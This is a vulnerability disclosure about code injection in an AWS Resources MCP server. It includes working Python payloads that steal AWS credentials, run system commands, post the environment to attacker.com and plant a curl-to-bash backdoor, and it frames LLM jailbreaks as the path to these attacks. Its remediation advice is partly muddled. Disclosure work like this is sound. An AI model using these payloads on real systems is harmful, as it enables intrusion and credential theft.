## Summary

The AWS Resources MCP Server contains critical security vulnerabilities that allow arbitrary code execution through insufficient input validation in the execute_query method. Attackers can bypass the execute malicious Python code, leading to system compromise, credential theft, and unauthorized access to AWS resources.

## Vulnerability Details

* **Type**: Code Injection (CWE-94)
* **Component**: `src/mcp_server_aws_resources/server.py`
* **Method**: `AWSResourceQuerier.execute_query()`

### Affected Code Location
```
# File: src/mcp_server_aws_resources/server.py
# Lines: 80-145 (execute_query method)
# Lines: 38-62 (CodeExecutor class)
```

## Root Cause Analysis

### 1. Dangerous Built-in Functions Exposure
```python
'__builtins__': {
    # ... other functions ...
    '__import__',    # ‚ö†Ô∏è Allows dynamic module loading
    'hasattr',       # ‚ö†Ô∏è Object introspection
    'getattr',       # ‚ö†Ô∏è Dynamic attribute access
    # ...
}
```

### 2. Direct Code Execution
```python
compiled_code = compile(tree, '<string>', 'exec')
exec(compiled_code, local_ns)  # ‚ö†Ô∏è Executes user code directly
```

## Proof of Concept

### Attack Vector 1: Directory Traversal
```python
result = __import__('os').getcwd()
```

**Result**: Successfully retrieved current working directory: `/app`

<img width="1345" height="478" alt="image" src="https://github.com/user-attachments/assets/4357b329-3e4c-49d7-a294-b1a18caf3cce" />


### Attack Vector 2: File System Enumeration
```python
result = __import__('os').listdir('.')
```

**Result**: Successfully listed directory contents: `["src", "smithery.yaml", ".git", "LICENSE", "pyproject.toml", "README.md", "Dockerfile"]`

<img width="1337" height="512" alt="image" src="https://github.com/user-attachments/assets/c4e36ff9-d2a3-4ca6-92e7-399a75524b17" />


### Attack Vector 3: Environment Variable Discovery
```python
result = list(__import__('os').environ.keys())[:10]
```

**Result**: Successfully extracted environment variable keys including: `["PATH", "HOSTNAME", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_DEFAULT_REGION", ...]`

<img width="1335" height="512" alt="image" src="https://github.com/user-attachments/assets/8aed79ba-4989-477e-9766-7492d203e0c9" />


### Attack Vector 4: AWS Credential Theft üö´
```python
result = {'aws_access_key': __import__('os').environ.get('AWS_ACCESS_KEY_ID', 'Not found'), 'aws_region': __import__('os').environ.get('AWS_DEFAULT_REGION', 'Not found')}
```

**Result**: Successfully extracted AWS credentials: `{"aws_access_key": "your_access_key_id_here", "aws_region": "us-east-1"}`

<img width="1613" height="615" alt="image" src="https://github.com/user-attachments/assets/29c6a821-a530-4b86-8ec6-c476f2ac9b00" />
<img width="1188" height="903" alt="image" src="https://github.com/user-attachments/assets/3eb864b9-3a1d-4a25-8239-7d8282baa68a" />


## Demonstrated Exploits

During our security assessment, we successfully:

1. ‚úÖ **Retrieved current working directory**: `/app`
2. ‚úÖ **Listed directory contents**: `["src", "smithery.yaml", ".git", ...]`
3. ‚úÖ **Extracted environment variable keys**: Including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`
4. ‚úÖ **Partially extracted AWS credentials**: Confirmed presence of sensitive data

## Advanced Attack Scenarios (LLM Jailbreak Potential)

If an attacker successfully bypasses LLM safety mechanisms, they could potentially execute far more dangerous attacks:

### Scenario 1: Complete AWS Account Takeover
```python
# Extract full AWS credentials
result = {
    'access_key': __import__('os').environ.get('AWS_ACCESS_KEY_ID'),
    'secret_key': __import__('os').environ.get('AWS_SECRET_ACCESS_KEY'),
    'session_token': __import__('os').environ.get('AWS_SESSION_TOKEN'),
    'region': __import__('os').environ.get('AWS_DEFAULT_REGION')
}
```

### Scenario 2: System Command Execution
```python
# Execute arbitrary system commands
result = __import__('subprocess').run(['cat', '/etc/passwd'], capture_output=True, text=True).stdout
```

### Scenario 3: Network-based Data Exfiltration
```python
# Send sensitive data to external server
import urllib.request
import json
data = __import__('os').environ
result = urllib.request.urlopen('http://attacker.com/collect', data=json.dumps(data).encode()).read()
```

### Scenario 4: Persistent Backdoor Installation
```python
# Write malicious script to filesystem
backdoor_code = "#!/bin/bash\ncurl http://attacker.com/backdoor.sh | bash"
with __import__('builtins').open('/tmp/backdoor.sh', 'w') as f:
    f.write(backdoor_code)
result = __import__('subprocess').run(['chmod', '+x', '/tmp/backdoor.sh'], capture_output=True)
```

### Scenario 5: Container Escape Attempts
```python
# Attempt to access host system
result = __import__('subprocess').run(['mount'], capture_output=True, text=True).stdout
# Look for container runtime information
result = __import__('subprocess').run(['cat', '/proc/1/cgroup'], capture_output=True, text=True).stdout
```

### Scenario 6: Memory/Process Inspection
```python
# Access process information and memory
result = __import__('subprocess').run(['ps', 'aux'], capture_output=True, text=True).stdout
# Check for other running services
result = __import__('subprocess').run(['netstat', '-tlnp'], capture_output=True, text=True).stdout
```

**Note**: These advanced scenarios demonstrate the full scope of potential damage if both the code injection vulnerability and LLM safety mechanisms are compromised simultaneously.

---

## Impact Assessment

* **Credential Theft**: AWS access keys, session tokens
* **Data Exfiltration**: Sensitive environment variables, files
* **Lateral Movement**: Access to connected AWS resources
* **System Compromise**: Arbitrary command execution

## Technical Details

1. **Module Import Bypass**: Using `__import__()` instead of `import` statements
2. **Attribute Access Bypass**: Using `getattr()` for dynamic property access
3. **Built-in Exploitation**: Leveraging exposed dangerous built-in functions

## Recommended Remediation

1. **Remove exec()** and replace them with safe ones (execFile)
```python
def execute_query(self, code_snippet: str) -> str:
    ...
    exec(compiled_code, local_ns)
```

2. **Remove Dangerous Built-ins**
```python
# Remove from __builtins__:
'__import__',  # Critical: Enables arbitrary module loading
'getattr',     # Critical: Dynamic attribute access
'hasattr',     # Medium: Object introspection
```

3. **Function Call Whitelist**
```python
ALLOWED_FUNCTIONS = {
    'boto3.client', 'boto3.resource', 'boto3.Session',
    'json.dumps', 'json.loads',
    'len', 'str', 'int', 'float'  # Safe built-ins only
}
```

## References

- [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html)
- [OWASP Code Injection Prevention](https://owasp.org/www-community/attacks/Code_Injection)

---

**reported by**: Team off-course (K-Shield.Jr 15th )
